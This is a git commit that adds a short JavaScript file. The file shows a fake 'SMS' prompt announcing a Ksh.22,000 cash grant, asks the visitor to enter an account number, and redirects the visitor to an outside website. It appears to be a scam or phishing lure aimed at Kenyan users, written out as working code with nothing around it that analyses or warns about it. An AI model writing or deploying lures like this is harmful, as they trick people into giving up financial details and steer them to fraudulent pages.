349dd7209495e89ecf3978d5a619979628d5a79c
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-17 14:51:58 +0100

    Create kenyan-active.js

---
+++ kenyan-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Ksh.22,000'
+password=prompt('SMS: Congratulation. You are among the selected ones to Receive Ksh.22,000 Disbursing Cash Grants 2026, kindly press Ok to submit Account Number ','WITHDRAW Ksh.22,000');
+if (password != 'WITHDRAW Ksh.22,000') {
+location.href='https://gbamz.com/nyota.html';
+}
